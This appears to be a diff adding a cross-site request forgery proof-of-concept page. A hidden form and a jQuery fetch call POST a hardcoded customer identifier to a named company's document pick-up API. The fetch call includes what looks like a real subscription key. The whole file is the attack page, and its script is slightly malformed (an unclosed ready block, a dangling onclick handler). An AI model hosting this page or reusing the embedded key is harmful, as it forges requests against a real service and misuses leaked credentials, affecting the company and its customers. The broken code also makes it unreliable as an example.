@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form
+      action="https://dapi.tatadigital.com/api/v1/documentPickUp/DocumentPickUp"
+      method="POST"
+      id="form"
+    >
+      <input type="hidden" name="customerhash" value="G876543" />
+      <button id="button" type="submit" onclick="handlebutton">submit</button>
+    </form>
+    <script src="https://code.jquery.com/jquery-3.5.0.slim.min.js"></script>
+    <script>
+      $(document).ready(() => {
+        $("#button").on("click",function (){
+          fetch('https://dapi.tatadigital.com/api/v1/documentPickUp/DocumentPickUp', {
+                method: 'POST',
+                headers:{
+                  'Content-Type': 'text/plain',
+                  'Ocp-Apim-Subscription-Key': '354d9be9edce479fbd797edc71ebf50b'
+                },
+                body: JSON.stringify({
+            "customerhash": "G876543",
+        })
+            })
+        });
+      const submit = () => {
+        $("#form").submit();
+      };
+    </script>
+  </body>
+</html>
